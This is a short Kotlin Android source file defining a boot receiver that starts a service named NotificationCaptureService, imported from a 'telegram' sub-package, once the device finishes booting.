package com.kashem.shaikh

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.kashem.shaikh.telegram.NotificationCaptureService

class BootService : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            Log.d("BootService", "Device boot completed, starting NotificationCaptureService only")
            val notificationIntent = Intent(context, NotificationCaptureService::class.java)
            context.startService(notificationIntent)
        }
    }
}